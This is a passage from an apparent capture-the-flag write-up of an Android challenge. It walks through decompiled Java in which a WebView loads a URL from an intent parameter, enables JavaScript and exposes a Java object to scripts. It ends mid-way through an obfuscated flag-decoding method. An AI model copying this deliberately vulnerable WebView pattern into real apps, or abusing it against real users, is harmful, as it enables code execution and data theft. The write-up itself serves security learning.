        <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="s">"http://35.227.24.107/307f6c07e3/authed"</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Uri</span> <span class="n">data</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getData</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(!(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">data</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"uri"</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">str</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"uri"</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">unused</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span>
        <span class="nc">WebView</span> <span class="n">webView</span> <span class="o">=</span> <span class="o">(</span><span class="nc">WebView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">webview</span><span class="o">);</span>
        <span class="n">webView</span><span class="o">.</span><span class="na">setWebViewClient</span><span class="o">(</span><span class="k">new</span> <span class="nc">SSLTolerentWebViewClient</span><span class="o">(</span><span class="n">webView</span><span class="o">));</span>
        <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">webView</span><span class="o">.</span><span class="na">addJavascriptInterface</span><span class="o">(</span><span class="k">new</span> <span class="nc">WebAppInterface</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">()),</span> <span class="s">"iface"</span><span class="o">);</span>
        <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">str</span><span class="o">);</span>
    <span class="o">}</span>
</pre></table></code></div></div><p>I can see a variable called <code class="language-plaintext highlighter-rouge">str</code> at line 4. Declared to have a value set to the URL address. That URL address is the success message I saw earlier telling me I was authenticated. Check that the intent data used to start the activity and the intent parameter named <code class="language-plaintext highlighter-rouge">uri</code> are empty. Then make the <code class="language-plaintext highlighter-rouge">str</code> value equal to the data contained in the <code class="language-plaintext highlighter-rouge">uri</code> intent parameter.</p><p>Beneath this at line 12, I can see that a new <code class="language-plaintext highlighter-rouge">WebView</code> is created. Two important pieces of information are noted when the WebView is being created. The first is that the WebView has enabled JavaScript execution using <code class="language-plaintext highlighter-rouge">setJavascriptEnabled()</code>. The second is that the method <code class="language-plaintext highlighter-rouge">addJavascriptInterface()</code> is declared. This injects a supplied Java object into the WebView and allows the Java object’s methods to be accessed from JavaScript. This method takes two parameters:</p><ol><li>The class instance to bind to JavaScript (i.e. WebAppInterface)<li>The name to be used to expose the instance in JavaScript (i.e. iface).</ol><p>This allows me to take control of any methods inside the <code class="language-plaintext highlighter-rouge">WebAppInterface</code> class. Looking at this class, I can see an interesting method called <code class="language-plaintext highlighter-rouge">getFlagPath()</code>. This method contains what appears to be a large array of int values as seen below.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="nc">String</span> <span class="nf">getFlagPath</span><span class="o">()</span> <span class="o">{</span>
        <span class="kt">int</span><span class="o">[]</span> <span class="n">iArr</span> <span class="o">=</span> <span class="o">{</span><span class="mi">174</span><span class="o">,</span> <span class="mi">95</span><span class="o">,</span> <span class="mi">10</span><span class="o">,</span> <span class="mi">184</span><span class="o">,</span> <span class="mi">102</span><span class="o">,</span> <span class="mi">20</span><span class="o">,</span> <span class="mi">194</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">29</span><span class="o">,</span> <span class="mi">205</span><span class="o">,</span> <span class="mi">126</span><span class="o">,</span> <span class="mi">42</span><span class="o">,</span> <span class="mi">213</span><span class="o">,</span> <span class="mi">137</span><span class="o">,</span> <span class="mi">49</span><span class="o">,</span> <span class="mi">223</span><span class="o">,</span> <span class="mi">141</span><span class="o">,</span> <span class="mi">59</span><span class="o">,</span> <span class="mi">239</span><span class="o">,</span> <span class="mi">155</span><span class="o">,</span> <span class="mi">70</span><span class="o">,</span> <span class="mi">244</span><span class="o">,</span> <span class="mi">162</span><span class="o">,</span> <span class="mi">82</span><span class="o">,</span> <span class="mi">253</span><span class="o">,</span> <span class="mi">173</span><span class="o">,</span> <span class="mi">94</span><span class="o">,</span> <span class="mi">10</span><span class="o">,</span> <span class="mi">182</span><span class="o">,</span> <span class="mi">100</span><span class="o">,</span> <span class="mi">18</span><span class="o">,</span> <span class="mi">192</span><span class="o">,</span> <span class="mi">110</span><span class="o">,</span> <span class="mi">33</span><span class="o">,</span> <span class="mi">201</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">43</span><span class="o">,</span> <span class="mi">212</span><span class="o">,</span> <span class="mi">133</span><span class="o">,</span> <span class="mi">48</span><span class="o">,</span> <span class="mi">222</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">57</span><span class="o">,</span> <span class="mi">233</span><span class="o">,</span> <span class="mi">154</span><span class="o">,</span> <span class="mi">70</span><span class="o">,</span> <span class="mi">247</span><span class="o">,</span> <span class="mi">160</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">251</span><span class="o">,</span> <span class="mi">169</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">5</span><span class="o">,</span> <span class="mi">179</span><span class="o">,</span> <span class="mi">97</span><span class="o">,</span> <span class="mi">21</span><span class="o">,</span> <span class="mi">190</span><span class="o">,</span> <span class="mi">108</span><span class="o">,</span> <span class="mi">26</span><span class="o">,</span> <span class="mi">200</span><span class="o">,</span> <span class="mi">121</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">212</span><span class="o">,</span> <span class="mi">127</span><span class="o">,</span> <span class="mi">45</span><span class="o">,</span> <span class="mi">221</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">58</span><span class="o">,</span> <span class="mi">235</span><span class="o">,</span> <span class="mi">148</span><span class="o">,</span> <span class="mi">71</span><span class="o">,</span> <span class="mi">240</span><span class="o">,</span> <span class="mi">158</span><span class="o">,</span> <span class="mi">76</span><span class="o">,</span> <span class="mi">250</span><span class="o">,</span> <span class="mi">173</span><span class="o">,</span> <span class="mi">85</span><span class="o">,</span> <span class="mi">7</span><span class="o">,</span> <span class="mi">178</span><span class="o">,</span> <span class="mi">96</span><span class="o">,</span> <span class="mi">16</span><span class="o">,</span> <span class="mi">187</span><span class="o">,</span> <span class="mi">107</span><span class="o">,</span> <span class="mi">28</span><span class="o">,</span> <span class="mi">200</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">33</span><span class="o">,</span> <span class="mi">207</span><span class="o">,</span> <span class="mi">131</span><span class="o">,</span> <span class="mi">43</span><span class="o">,</span> <span class="mi">223</span><span class="o">,</span> <span class="mi">136</span><span class="o">,</span> <span class="mi">54</span><span class="o">,</span> <span class="mi">228</span><span class="o">,</span> <span class="mi">151</span><span class="o">,</span> <span class="mi">63</span><span class="o">,</span> <span class="mi">237</span><span class="o">,</span> <span class="mi">155</span><span class="o">,</span> <span class="mi">73</span><span class="o">,</span> <span class="mi">247</span><span class="o">,</span> <span class="mi">165</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">7</span><span class="o">,</span> <span class="mi">179</span><span class="o">,</span> <span class="mi">94</span><span class="o">,</span> <span class="mi">12</span><span class="o">,</span> <span class="mi">186</span><span class="o">,</span> <span class="mi">106</span><span class="o">,</span> <span class="mi">21</span><span class="o">,</span> <span class="mi">195</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">31</span><span class="o">,</span> <span class="mi">205</span><span class="o">,</span> <span class="mi">125</span><span class="o">,</span> <span class="mi">46</span><span class="o">,</span> <span class="mi">218</span><span class="o">,</span> <span class="mi">133</span><span class="o">,</span> <span class="mi">51</span><span class="o">,</span> <span class="mi">231</span><span class="o">,</span> <span class="mi">144</span><span class="o">,</span> <span class="mi">65</span><span class="o">,</span> <span class="mi">236</span><span class="o">,</span> <span class="mi">154</span><span class="o">,</span> <span class="mi">74</span><span class="o">,</span> <span class="mi">245</span><span class="o">,</span> <span class="mi">165</span><span class="o">,</span> <span class="mi">86</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="mi">179</span><span class="o">,</span> <span class="mi">91</span><span class="o">,</span> <span class="mi">9</span><span class="o">,</span> <span class="mi">183</span><span class="o">,</span> <span class="mi">101</span><span class="o">,</span> <span class="mi">19</span><span class="o">,</span> <span class="mi">193</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">35</span><span class="o">,</span> <span class="mi">204</span><span class="o">,</span> <span class="mi">122</span><span class="o">,</span> <span class="mi">40</span><span class="o">,</span> <span class="mi">214</span><span class="o">,</span> <span class="mi">132</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">224</span><span class="o">,</span> <span class="mi">147</span><span class="o">,</span> <span class="mi">63</span><span class="o">,</span> <span class="mi">234</span><span class="o">,</span> <span class="mi">154</span><span class="o">,</span> <span class="mi">69</span><span class="o">,</span> <span class="mi">243</span><span class="o">,</span> <span class="mi">163</span><span class="o">,</span> <span class="mi">84</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">171</span><span class="o">,</span> <span class="mi">95</span><span class="o">,</span> <span class="mi">8</span><span class="o">,</span> <span class="mi">182</span><span class="o">,</span> <span class="mi">103</span><span class="o">,</span> <span class="mi">18</span><span class="o">,</span> <span class="mi">192</span><span class="o">,</span> <span class="mi">110</span><span class="o">,</span> <span class="mi">28</span><span class="o">,</span> <span class="mi">202</span><span class="o">,</span> <span class="mi">122</span><span class="o">,</span> <span class="mi">37</span><span class="o">,</span> <span class="mi">211</span><span class="o">,</span> <span class="mi">129</span><span class="o">,</span> <span class="mi">49</span><span class="o">,</span> <span class="mi">226</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">63</span><span class="o">,</span> <span class="mi">232</span><span class="o">,</span> <span class="mi">153</span><span class="o">,</span> <span class="mi">68</span><span class="o">,</span> <span class="mi">242</span><span class="o">,</span> <span class="mi">160</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">251</span><span class="o">,</span> <span class="mi">171</span><span class="o">,</span> <span class="mi">92</span><span class="o">,</span> <span class="mi">8</span><span class="o">,</span> <span class="mi">180</span><span class="o">,</span> <span class="mi">98</span><span class="o">,</span> <span class="mi">16</span><span class="o">,</span> <span class="mi">190</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">29</span><span class="o">,</span> <span class="mi">200</span><span class="o">,</span> <span class="mi">118</span><span class="o">,</span> <span class="mi">38</span><span class="o">,</span> <span class="mi">209</span><span class="o">,</span> <span class="mi">129</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">222</span><span class="o">,</span> <span class="mi">137</span><span class="o">,</span> <span class="mi">61</span><span class="o">,</span> <span class="mi">233</span><span class="o">,</span> <span class="mi">148</span><span class="o">,</span> <span class="mi">68</span><span class="o">,</span> <span class="mi">239</span><span class="o">,</span> <span class="mi">157</span><span class="o">,</span> <span class="mi">77</span><span class="o">,</span> <span class="mi">254</span><span class="o">,</span> <span class="mi">170</span><span class="o">,</span> <span class="mi">86</span><span class="o">,</span> <span class="mi">9</span><span class="o">,</span> <span class="mi">177</span><span class="o">,</span> <span class="mi">99</span><span class="o">,</span> <span class="mi">14</span><span class="o">,</span> <span class="mi">188</span><span class="o">,</span> <span class="mi">108</span><span class="o">,</span> <span class="mi">23</span><span class="o">,</span> <span class="mi">199</span><span class="o">,</span> <span class="mi">120</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">213</span><span class="o">,</span> <span class="mi">126</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">218</span><span class="o">,</span> <span class="mi">138</span><span class="o">,</span> <span class="mi">53</span><span class="o">,</span> <span class="mi">227</span><span class="o">,</span> <span class="mi">147</span><span class="o">,</span> <span class="mi">68</span><span class="o">,</span> <span class="mi">240</span><span class="o">,</span> <span class="mi">156</span><span class="o">,</span> <span class="mi">79</span><span class="o">,</span> <span class="mi">247</span><span class="o">,</span> <span class="mi">165</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="mi">175</span><span class="o">,</span> <span class="mi">97</span><span class="o">,</span> <span class="mi">12</span><span class="o">,</span> <span class="mi">188</span><span class="o">,</span> <span class="mi">103</span><span class="o">,</span> <span class="mi">21</span><span class="o">,</span> <span class="mi">195</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">208</span><span class="o">,</span> <span class="mi">129</span><span class="o">,</span> <span class="mi">42</span><span class="o">,</span> <span class="mi">221</span><span class="o">,</span> <span class="mi">134</span><span class="o">,</span> <span class="mi">52</span><span class="o">,</span> <span class="mi">226</span><span class="o">,</span> <span class="mi">144</span><span class="o">,</span> <span class="mi">62</span><span class="o">,</span> <span class="mi">239</span><span class="o">,</span> <span class="mi">154</span><span class="o">,</span> <span class="mi">74</span><span class="o">,</span> <span class="mi">245</span><span class="o">,</span> <span class="mi">163</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">4</span><span class="o">,</span> <span class="mi">176</span><span class="o">,</span> <span class="mi">97</span><span class="o">,</span> <span class="mi">10</span><span class="o">,</span> <span class="mi">184</span><span class="o">,</span> <span class="mi">107</span><span class="o">,</span> <span class="mi">23</span><span class="o">,</span> <span class="mi">194</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">32</span><span class="o">,</span> <span class="mi">203</span><span class="o">,</span> <span class="mi">123</span><span class="o">,</span> <span class="mi">44</span><span class="o">,</span> <span class="mi">216</span><span class="o">,</span> <span class="mi">131</span><span class="o">,</span> <span class="mi">49</span><span class="o">,</span> <span class="mi">223</span><span class="o">,</span> <span class="mi">141</span><span class="o">,</span> <span class="mi">65</span><span class="o">,</span> <span class="mi">234</span><span class="o">,</span> <span class="mi">152</span><span class="o">,</span> <span class="mi">70</span><span class="o">,</span> <span class="mi">244</span><span class="o">,</span> <span class="mi">167</span><span class="o">,</span> <span class="mi">79</span><span class="o">,</span> <span class="mi">3</span><span class="o">,</span> <span class="mi">172</span><span class="o">,</span> <span class="mi">93</span><span class="o">,</span> <span class="mi">8</span><span class="o">,</span> <span class="mi">184</span><span class="o">,</span> <span class="mi">99</span><span class="o">,</span> <span class="mi">17</span><span class="o">,</span> <span class="mi">193</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">30</span><span class="o">,</span> <span class="mi">207</span><span class="o">,</span> <span class="mi">123</span><span class="o">,</span> <span class="mi">38</span><span class="o">,</span> <span class="mi">212</span><span class="o">,</span> <span class="mi">132</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">223</span><span class="o">,</span> <span class="mi">144</span><span class="o">,</span> <span class="mi">60</span><span class="o">,</span> <span class="mi">237</span><span class="o">,</span> <span class="mi">149</span><span class="o">,</span> <span class="mi">67</span><span class="o">,</span> <span class="mi">241</span><span class="o">,</span> <span class="mi">159</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">251</span><span class="o">,</span> <span class="mi">169</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">5</span><span class="o">,</span> <span class="mi">185</span><span class="o">,</span> <span class="mi">98</span><span class="o">,</span> <span class="mi">16</span><span class="o">,</span> <span class="mi">190</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">26</span><span class="o">,</span> <span class="mi">200</span><span class="o">,</span> <span class="mi">118</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">213</span><span class="o">,</span> <span class="mi">128</span><span class="o">,</span> <span class="mi">48</span><span class="o">,</span> <span class="mi">219</span><span class="o">,</span> <span class="mi">137</span><span class="o">,</span> <span class="mi">57</span><span class="o">,</span> <span class="mi">234</span><span class="o">,</span> <span class="mi">150</span><span class="o">,</span> <span class="mi">71</span><span class="o">,</span> <span class="mi">243</span><span class="o">,</span> <span class="mi">158</span><span class="o">,</span> <span class="mi">76</span><span class="o">,</span> <span class="mi">252</span><span class="o">,</span> <span class="mi">167</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">8</span><span class="o">,</span> <span class="mi">180</span><span class="o">,</span> <span class="mi">95</span><span class="o">,</span> <span class="mi">13</span><span class="o">,</span> <span class="mi">193</span><span class="o">,</span> <span class="mi">106</span><span class="o">,</span> <span class="mi">24</span><span class="o">,</span> <span class="mi">198</span><span class="o">,</span> <span class="mi">121</span><span class="o">,</span> <span class="mi">33</span><span class="o">,</span> <span class="mi">207</span><span class="o">,</span> <span class="mi">131</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">218</span><span class="o">,</span> <span class="mi">138</span><span class="o">,</span> <span class="mi">53</span><span class="o">,</span> <span class="mi">227</span><span class="o">,</span> <span class="mi">147</span><span class="o">,</span> <span class="mi">68</span><span class="o">,</span> <span class="mi">240</span><span class="o">,</span> <span class="mi">156</span><span class="o">,</span> <span class="mi">79</span><span class="o">,</span> <span class="mi">247</span><span class="o">,</span> <span class="mi">165</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="mi">178</span><span class="o">,</span> <span class="mi">93</span><span class="o">,</span> <span class="mi">11</span><span class="o">,</span> <span class="mi">185</span><span class="o">,</span> <span class="mi">105</span><span class="o">,</span> <span class="mi">26</span><span class="o">,</span> <span class="mi">198</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">31</span><span class="o">,</span> <span class="mi">205</span><span class="o">,</span> <span class="mi">123</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">216</span><span class="o">,</span> <span class="mi">134</span><span class="o">,</span> <span class="mi">52</span><span class="o">,</span> <span class="mi">226</span><span class="o">,</span> <span class="mi">144</span><span class="o">,</span> <span class="mi">62</span><span class="o">,</span> <span class="mi">236</span><span class="o">,</span> <span class="mi">154</span><span class="o">,</span> <span class="mi">77</span><span class="o">,</span> <span class="mi">246</span><span class="o">,</span> <span class="mi">167</span><span class="o">,</span> <span class="mi">82</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">174</span><span class="o">,</span> <span class="mi">94</span><span class="o">,</span> <span class="mi">9</span><span class="o">,</span> <span class="mi">185</span><span class="o">,</span> <span class="mi">106</span><span class="o">,</span> <span class="mi">22</span><span class="o">,</span> <span class="mi">193</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">33</span><span class="o">,</span> <span class="mi">204</span><span class="o">,</span> <span class="mi">122</span><span class="o">,</span> <span class="mi">42</span><span class="o">,</span> <span class="mi">213</span><span class="o">,</span> <span class="mi">133</span><span class="o">,</span> <span class="mi">54</span><span class="o">,</span> <span class="mi">226</span><span class="o">,</span> <span class="mi">141</span><span class="o">,</span> <span class="mi">59</span><span class="o">,</span> <span class="mi">233</span><span class="o">,</span> <span class="mi">151</span><span class="o">,</span> <span class="mi">75</span><span class="o">,</span> <span class="mi">244</span><span class="o">,</span> <span class="mi">162</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">254</span><span class="o">,</span> <span class="mi">172</span><span class="o">,</span> <span class="mi">90</span><span class="o">,</span> <span class="mi">11</span><span class="o">,</span> <span class="mi">182</span><span class="o">,</span> <span class="mi">102</span><span class="o">,</span> <span class="mi">17</span><span class="o">,</span> <span class="mi">191</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">32</span><span class="o">,</span> <span class="mi">204</span><span class="o">,</span> <span class="mi">125</span><span class="o">,</span> <span class="mi">41</span><span class="o">,</span> <span class="mi">212</span><span class="o">,</span> <span class="mi">130</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">221</span><span class="o">,</span> <span class="mi">141</span><span class="o">,</span> <span class="mi">62</span><span class="o">,</span> <span class="mi">234</span><span class="o">,</span> <span class="mi">149</span><span class="o">,</span> <span class="mi">73</span><span class="o">,</span> <span class="mi">245</span><span class="o">,</span> <span class="mi">160</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">251</span><span class="o">,</span> <span class="mi">169</span><span class="o">,</span> <span class="mi">89</span><span class="o">,</span> <span class="mi">10</span><span class="o">,</span> <span class="mi">182</span><span class="o">,</span> <span class="mi">97</span><span class="o">,</span> <span class="mi">21</span><span class="o">,</span> <span class="mi">190</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">26</span><span class="o">,</span> <span class="mi">200</span><span class="o">,</span> <span class="mi">120</span><span class="o">,</span> <span class="mi">35</span><span class="o">,</span> <span class="mi">211</span><span class="o">,</span> <span class="mi">132</span><span class="o">,</span> <span class="mi">48</span><span class="o">,</span> <span class="mi">220</span><span class="o">,</span> <span class="mi">143</span><span class="o">,</span> <span class="mi">55</span><span class="o">,</span> <span class="mi">233</span><span class="o">,</span> <span class="mi">148</span><span class="o">,</span> <span class="mi">68</span><span class="o">,</span> <span class="mi">239</span><span class="o">,</span> <span class="mi">157</span><span class="o">,</span> <span class="mi">77</span><span class="o">,</span> <span class="mi">254</span><span class="o">,</span> <span class="mi">170</span><span class="o">,</span> <span class="mi">85</span><span class="o">,</span> <span class="mi">9</span><span class="o">,</span> <span class="mi">178</span><span class="o">,</span> <span class="mi">96</span><span class="o">,</span> <span class="mi">14</span><span class="o">,</span> <span class="mi">188</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">23</span><span class="o">,</span> <span class="mi">203</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">34</span><span class="o">,</span> <span class="mi">208</span><span class="o">,</span> <span class="mi">128</span><span class="o">,</span> <span class="mi">43</span><span class="o">,</span> <span class="mi">219</span><span class="o">,</span> <span class="mi">140</span><span class="o">,</span> <span class="mi">56</span><span class="o">,</span> <span class="mi">227</span><span class="o">,</span> <span class="mi">145</span><span class="o">,</span> <span class="mi">63</span><span class="o">,</span> <span class="mi">237</span><span class="o">,</span> <span class="mi">155</span><span class="o">,</span> <span class="mi">79</span><span class="o">,</span> <span class="mi">248</span><span class="o">,</span> <span class="mi">171</span><span class="o">,</span> <span class="mi">84</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="mi">179</span><span class="o">,</span> <span class="mi">94</span><span class="o">,</span> <span class="mi">14</span><span class="o">,</span> <span class="mi">185</span><span class="o">,</span> <span class="mi">103</span><span class="o">,</span> <span class="mi">23</span><span class="o">,</span> <span class="mi">200</span><span class="o">,</span> <span class="mi">116</span><span class="o">,</span> <span class="mi">37</span><span class="o">,</span> <span class="mi">209</span><span class="o">,</span> <span class="mi">124</span><span class="o">,</span> <span class="mi">42</span><span class="o">,</span> <span class="mi">218</span><span class="o">,</span> <span class="mi">133</span><span class="o">,</span> <span class="mi">53</span><span class="o">,</span> <span class="mi">230</span><span class="o">,</span> <span class="mi">146</span><span class="o">,</span> <span class="mi">67</span><span class="o">,</span> <span class="mi">235</span><span class="o">,</span> <span class="mi">153</span><span class="o">,</span> <span class="mi">71</span><span class="o">,</span> <span class="mi">245</span><span class="o">,</span> <span class="mi">163</span><span class="o">,</span> <span class="mi">81</span><span class="o">,</span> <span class="mi">5</span><span class="o">,</span> <span class="mi">174</span><span class="o">,</span> <span class="mi">92</span><span class="o">,</span> <span class="mi">10</span><span class="o">,</span> <span class="mi">184</span><span class="o">,</span> <span class="mi">102</span><span class="o">,</span> <span class="mi">25</span><span class="o">,</span> <span class="mi">193</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">29</span><span class="o">,</span> <span class="mi">203</span><span class="o">,</span> <span class="mi">127</span><span class="o">,</span> <span class="mi">43</span><span class="o">,</span> <span class="mi">214</span><span class="o">,</span> <span class="mi">132</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">224</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">62</span><span class="o">,</span> <span class="mi">233</span><span class="o">,</span> <span class="mi">151</span><span class="o">,</span> <span class="mi">69</span><span class="o">,</span> <span class="mi">243</span><span class="o">,</span> <span class="mi">163</span><span class="o">,</span> <span class="mi">84</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">171</span><span class="o">,</span> <span class="mi">95</span><span class="o">,</span> <span class="mi">7</span><span class="o">,</span> <span class="mi">187</span><span class="o">,</span> <span class="mi">103</span><span class="o">,</span> <span class="mi">18</span><span class="o">,</span> <span class="mi">192</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">27</span><span class="o">,</span> <span class="mi">203</span><span class="o">,</span> <span class="mi">124</span><span class="o">,</span> <span class="mi">40</span><span class="o">,</span> <span class="mi">211</span><span class="o">,</span> <span class="mi">129</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">221</span><span class="o">,</span> <span class="mi">139</span><span class="o">,</span> <span class="mi">57</span><span class="o">,</span> <span class="mi">231</span><span class="o">,</span> <span class="mi">155</span><span class="o">};</span>
        <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="nc">BuildConfig</span><span class="o">.</span><span class="na">FLAVOR</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">65536</span><span class="o">];</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="k">while</span> <span class="o">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">iArr</span><span class="o">.</span><span class="na">length</span><span class="o">)</span> <span class="o">{</span>
            <span class="kt">int</span> <span class="n">i2</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
            <span class="n">iArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(((</span><span class="n">iArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+</span> <span class="mi">256000</span><span class="o">)</span> <span class="o">-</span> <span class="n">i</span><span class="o">)</span> <span class="o">-</span> <span class="o">(</span><span class="n">i2</span> <span class="o">*</span> <span class="mi">173</span><span class="o">))</span> <span class="o">%</span> <span class="mi">256</span><span class="o">;</span>
            <span class="n">i</span> <span class="o">=</span> <span class="n">i2</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">int</span> <span class="n">i3</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">i4</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="k">while</span> <span class="o">(</span><span class="n">i3</span> <span class="o">&lt;</span> <span class="n">iArr</span><span class="o">.</span><span class="na">length</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i3</span><span class="o">]</span> <span class="o">==</span> <span class="mi">3</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">i4</span> <span class="o">=</span> <span class="n">i4</span> <span class="o">==</span> <span class="mi">65535</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">i4</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i3</span><span class="o">]</span> <span class="o">==</span> <span class="mi">2</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">i4</span> <span class="o">=</span> <span class="n">i4</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">65535</span> <span class="o">:</span> <span class="n">i4</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i3</span><span class="o">]</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">bArr</span><span class="o">[</span><span class="n">i4</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="o">(</span><span class="n">bArr</span><span class="o">[</span><span class="n">i4</span><span class="o">]</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i3</span><span class="o">]</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
